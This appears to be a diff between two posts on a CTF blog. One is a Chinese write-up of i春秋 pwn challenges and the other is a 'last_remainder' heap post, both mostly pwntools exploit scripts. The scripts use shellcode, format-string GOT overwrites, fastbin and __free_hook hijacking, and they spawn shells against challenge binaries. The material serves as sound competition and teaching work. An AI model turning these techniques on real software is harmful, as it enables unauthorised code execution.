@@ -16,18 +16,13 @@
     <meta name="description" content>
     
     <title>
-      i春秋-第三季CTF答题赛write up - pumpkin9
+      last_remainder - pumpkin9
     </title>
     <link rel="manifest" href="/manifest.json">
     <link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon">
     <link rel="stylesheet" href="/style/style.css">
   </head>
   <body>
-    
-    <div id="post-toc" class="animated hiddenToc hide">
-      <span class="title">Toc</span>
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn"><span class="toc-text">pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Electrical-System"><span class="toc-text">Electrical System</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Car-Search-System"><span class="toc-text">Car Search System</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#geek-notes"><span class="toc-text">geek notes</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#reverse"><span class="toc-text">reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#integer-seq"><span class="toc-text">integer_seq</span></a></li></ol></li></ol>
-    </div>
     
     <div id="fixed-menu-wrap">
       <span class="iconfont icon-sousuo search-box menu-reset"></span>
@@ -156,31 +151,20 @@
         <article class="post-entry">
     <div class="header">
       
-      <div class="title">i春秋-第三季CTF答题赛write up</div>
+      <div class="title">last_remainder</div>
       <div class="meta">
         <span class="item">
           <span class="iconfont icon-time-circle"></span>
-          <span>2019/11/29</span>
+          <span>2019/12/12</span>
         </span>
 
         
-          <span class="item leancloud-visitors" id="/2019/11/29/i春秋-第三季CTF答题赛write-up/" data-flag-title="i春秋-第三季CTF答题赛write up">
+          <span class="item leancloud-visitors" id="/2019/12/12/last-remainder/" data-flag-title="last_remainder">
             <span class="iconfont icon-eye1"></span>
             <span class="leancloud-visitors-count"></span>
           </span>
         
 
-         
-        <span class="item">
-          <span class="iconfont icon-folder"></span>
-          <span>
-              
-                
-                  <a href="/categories/CTF">CTF</a>
-                
-              
-          </span>
-        </span>
         
         
          
@@ -189,11 +173,7 @@
             <span>
                 
                   
-                    <a href="/tags/pwn">pwn</a>
-                  
-                
-                  
-                    <a href="/tags/write up">write up</a>
+                    <a href="/tags/heap">heap</a>
                   
                 
             </span>
@@ -203,125 +183,114 @@
       <div>
       </div>
     </div>
-    <p>福利赛 题目还是比较友好的</p>
-<h1 id="pwn">pwn<a class="post-anchor" href="#pwn"></a></h1><h2 id="Electrical-System">Electrical System<a class="post-anchor" href="#Electrical-System"></a></h2><p>bss 段有可执行权限，写一段shellcode，控制程序跳转即可</p>
-<pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
-context.terminal=[<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'split'</span>,<span class="hljs-string">'-h'</span>]
-context.log_level=<span class="hljs-string">'debug'</span>
-<span class="hljs-comment">#p = process("./Electrical System")</span>
-p = remote(<span class="hljs-string">"120.55.43.255"</span>,<span class="hljs-number">11002</span>)
-elf=ELF(<span class="hljs-string">"./Electrical System"</span>)
+    <pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2</span>
+<span class="hljs-comment">#encoding:utf-8</span>
+<span class="hljs-comment">#__author__='pumpkin9@DL&amp;S'</span>
 
-shellcode =<span class="hljs-string">"\x48\x31\xc0\x48\x83\xc0\x3b\x48\x31\xff\x57\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x8d\x3c\x24\x48\x31\xf6\x48\x31\xd2\x0f\x05"</span>
-p.sendlineafter(<span class="hljs-string">"enter your electric card 's ID:\n"</span>,shellcode)
-payload = <span class="hljs-string">"Recharge"</span>+p8(<span class="hljs-number">0</span>)+<span class="hljs-string">"a"</span>*<span class="hljs-number">7</span>
-<span class="hljs-comment"># payload = "Check"+p8(0)+"a"*10</span>
-payload += p64(<span class="hljs-number">0x00000000006020E0</span>)
-
-p.sendlineafter(<span class="hljs-string">"Please enter your choice:\n"</span>,payload)
-
-p.interactive()</code></pre>
-
-<h2 id="Car-Search-System">Car Search System<a class="post-anchor" href="#Car-Search-System"></a></h2><p>格式化字符串，首先leak libc，然后修改0xff为0x66，直接修改栈上的值，程序会down掉，所以可以通过指针v8来修改<br>最后修改puts@got为system。</p>
-<pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
-context.terminal=[<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'split'</span>,<span class="hljs-string">'-h'</span>]
-<span class="hljs-comment"># context.log_level = 'debug'</span>
-<span class="hljs-comment"># p = process("./pwn")</span>
-p = remote(<span class="hljs-string">"120.55.43.255"</span>,<span class="hljs-number">11001</span>)
-elf=ELF(<span class="hljs-string">"./pwn"</span>)
-lib = ELF(<span class="hljs-string">"./libc6-i386_2.23-0ubuntu10_amd64.so"</span>)
-offset = <span class="hljs-number">30</span>
-
-
-p.recvuntil(<span class="hljs-string">"leave\n"</span>)
-p.sendline(<span class="hljs-string">"%59$p"</span>)
-__libc_start_main = int(p.recvline().strip(<span class="hljs-string">"\n"</span>),<span class="hljs-number">16</span>)<span class="hljs-number">-247</span>
-<span class="hljs-keyword">print</span> hex(__libc_start_main)
-libc = __libc_start_main - lib.symbols[<span class="hljs-string">'__libc_start_main'</span>]
-log.success(<span class="hljs-string">"libc base addr : 0x%x"</span>%libc)
-system = libc+lib.symbols[<span class="hljs-string">'system'</span>]
-log.success(<span class="hljs-string">"onegadget addr : 0x%x"</span>%system)
-
-p.recvuntil(<span class="hljs-string">"leave\n"</span>)
-payload = fmtstr_payload(<span class="hljs-number">30</span>,&#123;elf.got[<span class="hljs-string">"puts"</span>]:system&#125;)
-p.sendline(payload)
-
-
-p.recvuntil(<span class="hljs-string">"leave\n"</span>)
-payload = <span class="hljs-string">"%51$p"</span>
-p.sendline(payload)
-point = int(p.recvline().strip(<span class="hljs-string">"\n"</span>),<span class="hljs-number">16</span>)
-log.success(<span class="hljs-string">"pointer addr : 0x%x"</span>%point)
-
-
-p.recvuntil(<span class="hljs-string">"leave\n"</span>)
-payload = p32(point)+<span class="hljs-string">"%98c%30$hhn"</span>
-p.sendline(payload)
-
-
-
-p.sendlineafter(<span class="hljs-string">"ar in 7 day"</span>,<span class="hljs-string">"/bin/sh\x00"</span>)
-<span class="hljs-comment"># gdb.attach(p)</span>
-p.interactive()</code></pre>
-
-<h2 id="geek-notes">geek notes<a class="post-anchor" href="#geek-notes"></a></h2><p>UAF</p>
-<pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2.7</span>
-<span class="hljs-comment"># encoding:utf-8</span>
-<span class="hljs-comment"># ___Author___ : "pumpkin9"</span>
 <span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
-context(terminal=[<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'split'</span>,<span class="hljs-string">'-h'</span>])
-p =process(<span class="hljs-string">"./geek notes"</span>)
-libc = ELF(<span class="hljs-string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span>)
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">addnote</span><span class="hljs-params">(length,content)</span>:</span>
-	p.recvuntil(<span class="hljs-string">"Your choice :"</span>)
-	p.sendline(<span class="hljs-string">"1"</span>)
+<span class="hljs-keyword">import</span> sys
+<span class="hljs-keyword">import</span> requests
+<span class="hljs-comment"># context(log_level='debug',terminal=['tmux','split','-h'],arch='amd64')</span>
+file_name = <span class="hljs-string">'./pwn1'</span>
+libc_name = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>
+ip = <span class="hljs-string">'node3.buuoj.cn'</span>
+port = <span class="hljs-string">'26364'</span>
+context.arch = <span class="hljs-string">'amd64'</span>
+<span class="hljs-comment"># context.log_level='debug'</span>
+context.terminal=[<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'split'</span>,<span class="hljs-string">'-h'</span>]
+libc = ELF(libc_name)
+elf = ELF(file_name)
+p = process(file_name)
 
-	p.recvuntil(<span class="hljs-string">"Note size :"</span>)
-	p.sendline(str(length))
+li = <span class="hljs-keyword">lambda</span> name,x : log.info(name+<span class="hljs-string">':0x%x'</span>%x)
+ls = <span class="hljs-keyword">lambda</span> name,x : log.success(name+<span class="hljs-string">':0x%x'</span>%x)
+<span class="hljs-string">'''
+0x45216 execve("/bin/sh", rsp+0x30, environ)
+constraints:
+  rax == NULL
 
-	p.recvuntil(<span class="hljs-string">"Content :"</span>)
-	p.sendline(content)
+0x4526a execve("/bin/sh", rsp+0x30, environ)
+constraints:
+  [rsp+0x30] == NULL
 
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delnote</span><span class="hljs-params">(index)</span>:</span>
-	p.recvuntil(<span class="hljs-string">"Your choice :"</span>)
-	p.sendline(<span class="hljs-string">"2"</span>)
-	p.recvuntil(<span class="hljs-string">"Index :"</span>)
-	p.sendline(str(index))
+0xf02a4 execve("/bin/sh", rsp+0x50, environ)
+constraints:
+  [rsp+0x50] == NULL
 
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">printnote</span><span class="hljs-params">(idx)</span>:</span>
-	p.recvuntil(<span class="hljs-string">":"</span>)
-	p.sendline(<span class="hljs-string">"3"</span>)
-	p.recvuntil(<span class="hljs-string">":"</span>)
-	p.sendline(str(idx))
+0xf1147 execve("/bin/sh", rsp+0x70, environ)
+constraints:
+  [rsp+0x70] == NULL
+'''</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,content)</span>:</span>
+	p.sendlineafter(<span class="hljs-string">"choice&gt; "</span>,str(<span class="hljs-number">1</span>))
+	p.sendlineafter(<span class="hljs-string">"length&gt; "</span>,str(size))
+	p.sendlineafter(<span class="hljs-string">"content&gt; "</span>,content)
 
-addnote(<span class="hljs-number">0x100</span>,<span class="hljs-string">""</span>) <span class="hljs-comment"># 0</span>
-addnote(<span class="hljs-number">0x100</span>,<span class="hljs-string">""</span>) <span class="hljs-comment"># 1</span>
-delnote(<span class="hljs-number">0</span>)
-printnote(<span class="hljs-number">0</span>)
-libc_base = u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">'\x00\x00'</span>)<span class="hljs-number">-3951480</span>
-log.success(<span class="hljs-string">"libc addr : 0x%x"</span>%libc_base)
-malloc_hook = libc_base+libc.symbols[<span class="hljs-string">'__malloc_hook'</span>]
-log.success(<span class="hljs-string">"malloc_hook:0x%x"</span>%malloc_hook)
-log.success(<span class="hljs-string">"one_gadget:0x%x"</span>%(libc_base+<span class="hljs-number">0xf1147</span>))
-addnote(<span class="hljs-number">0x100</span>,<span class="hljs-string">"aaaaaaaa"</span>) <span class="hljs-comment"># 2</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>
+	p.sendlineafter(<span class="hljs-string">"choice&gt; "</span>,str(<span class="hljs-number">2</span>))
+	p.sendlineafter(<span class="hljs-string">"index&gt; "</span>,str(idx))
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>
+	p.sendlineafter(<span class="hljs-string">"choice&gt; "</span>,str(<span class="hljs-number">3</span>))
+	p.sendlineafter(<span class="hljs-string">"index&gt; "</span>,str(idx))
+
+fkchunk = <span class="hljs-string">"/bin/sh||aaaaaaa\x31"</span>
 
 
-addnote(<span class="hljs-number">0x68</span>,<span class="hljs-string">"aaaaaaaa"</span>) <span class="hljs-comment"># 3</span>
-addnote(<span class="hljs-number">0x68</span>,<span class="hljs-string">"bbbbbbbb"</span>) <span class="hljs-comment"># 4</span>
-delnote(<span class="hljs-number">3</span>)
-delnote(<span class="hljs-number">4</span>)
-delnote(<span class="hljs-number">3</span>)
-addnote(<span class="hljs-number">0x68</span>,p64(malloc_hook<span class="hljs-number">-0x23</span>))
-addnote(<span class="hljs-number">0x68</span>,<span class="hljs-string">""</span>)
-addnote(<span class="hljs-number">0x68</span>,<span class="hljs-string">""</span>)
-addnote(<span class="hljs-number">0x68</span>,<span class="hljs-string">"a"</span>*<span class="hljs-number">19</span>+p64(libc_base+<span class="hljs-number">0xf1147</span>))
-p.sendlineafter(<span class="hljs-string">"Your choice :"</span>,str(<span class="hljs-number">1</span>))
-p.sendlineafter(<span class="hljs-string">"Note size :"</span>,str(<span class="hljs-number">10</span>))
+p.sendlineafter(<span class="hljs-string">"name&gt; "</span>,fkchunk)
 
-<span class="hljs-comment"># gdb.attach(p)</span>
+add(<span class="hljs-number">0xf8</span>, <span class="hljs-string">""</span>) <span class="hljs-comment">#A 0</span>
+add(<span class="hljs-number">0x1f8</span>,<span class="hljs-string">""</span>) <span class="hljs-comment">#B 1</span>
+add(<span class="hljs-number">0xf8</span>, <span class="hljs-string">""</span>) <span class="hljs-comment">#C 2</span>
+
+free(<span class="hljs-number">1</span>)
+free(<span class="hljs-number">0</span>)
+
+add(<span class="hljs-number">0x100</span>,<span class="hljs-string">""</span>) <span class="hljs-comment">#A 0</span>
+
+add(<span class="hljs-number">0x78</span>, <span class="hljs-string">""</span>) <span class="hljs-comment">#B1 1</span>
+add(<span class="hljs-number">0x108</span>,<span class="hljs-string">""</span>) <span class="hljs-comment">#B2 3</span>
+add(<span class="hljs-number">0x8</span>,  <span class="hljs-string">""</span>) <span class="hljs-comment">#B3 4</span>
+add(<span class="hljs-number">0x18</span>, <span class="hljs-string">""</span>) <span class="hljs-comment">#B4 5</span>
+
+free(<span class="hljs-number">1</span>)
+free(<span class="hljs-number">2</span>)
+
+add(<span class="hljs-number">0x78</span>, <span class="hljs-string">""</span>) <span class="hljs-comment">#B1 1</span>
+add(<span class="hljs-number">0x108</span>,<span class="hljs-string">""</span>) <span class="hljs-comment">#B2 2</span>
+add(<span class="hljs-number">0x8</span>,  <span class="hljs-string">""</span>) <span class="hljs-comment">#B3 6</span>
+add(<span class="hljs-number">0x18</span>, <span class="hljs-string">""</span>) <span class="hljs-comment">#B4 7</span>
+add(<span class="hljs-number">0x10</span>, <span class="hljs-string">""</span>) <span class="hljs-comment">#8</span>
+add(<span class="hljs-number">0x18</span>, <span class="hljs-string">""</span>) <span class="hljs-comment">#9</span>
+<span class="hljs-comment"># add(0x18, "")</span>
+free(<span class="hljs-number">3</span>)
+show(<span class="hljs-number">2</span>)
+libc.address = u64(p.recvuntil(<span class="hljs-string">"\n"</span>,<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">"\x00"</span>))<span class="hljs-number">-3951480</span>
+ls(<span class="hljs-string">"libc addr"</span>,libc.address)
+
+free(<span class="hljs-number">8</span>)
+free(<span class="hljs-number">4</span>)
+show(<span class="hljs-number">6</span>)
+heap_addr = u64(p.recvuntil(<span class="hljs-string">"\n"</span>,<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">"\x00"</span>))<span class="hljs-number">-928</span>+<span class="hljs-number">0x18</span>
+ls(<span class="hljs-string">"heap addr"</span>,heap_addr)
+
+
+free(<span class="hljs-number">5</span>)
+free(<span class="hljs-number">9</span>)
+free(<span class="hljs-number">7</span>)
+add(<span class="hljs-number">0x20</span>, p64(heap_addr)) <span class="hljs-comment">#2</span>
+add(<span class="hljs-number">0x20</span>, <span class="hljs-string">""</span>) <span class="hljs-comment">#3</span>
+add(<span class="hljs-number">0x20</span>, <span class="hljs-string">""</span>) <span class="hljs-comment">#4</span>
+add(<span class="hljs-number">0x20</span>, <span class="hljs-string">"a"</span>*<span class="hljs-number">8</span>+p64(libc.symbols[<span class="hljs-string">'__free_hook'</span>]))
+
+
+p.sendlineafter(<span class="hljs-string">"choice&gt; "</span>,str(<span class="hljs-number">4</span>))
+p.sendlineafter(<span class="hljs-string">"remarks&gt;"</span>,p64(libc.symbols[<span class="hljs-string">'system'</span>]))
+
+gdb.attach(p)
 p.interactive()</code></pre>
 
-<h1 id="reverse">reverse<a class="post-anchor" href="#reverse"></a></h1><h2 id="integer-seq">integer_seq<a class="post-anchor" href="#integer-seq"></a></h2>
+
 
   
     <div class="post-reward">
@@ -347,12 +316,10 @@ p.interactive()</code></pre>
   <div class="post-guide">
     <div class="item left">
         
-          <a href="/2019/12/09/SWPUCTF-2019-write-up-md/">SWPUCTF 2019 write up</a>
-        
     </div>
     <div class="item right">
         
-          <a href="/2019/11/03/山东深思杯write-up/">山东深思杯write up</a>
+          <a href="/2019/12/09/SWPUCTF-2019-write-up-md/">SWPUCTF 2019 write up</a>
         
     </div>
   </div>
@@ -364,7 +331,7 @@ p.interactive()</code></pre>
       本文作者：<a href="http://pumpkin9.github.io">pumpkin9</a>
     </div>
     <div class="link">
-      永久链接：<a href="http://pumpkin9.github.io/2019/11/29/i春秋-第三季CTF答题赛write-up/">http://pumpkin9.github.io/2019/11/29/i春秋-第三季CTF答题赛write-up/</a>
+      永久链接：<a href="http://pumpkin9.github.io/2019/12/12/last-remainder/">http://pumpkin9.github.io/2019/12/12/last-remainder/</a>
     </div>
     <div class="declare">
       版权声明：本文首发于<a href="http://pumpkin9.github.io">pumpkin9</a>的博客，转载请注明出处！
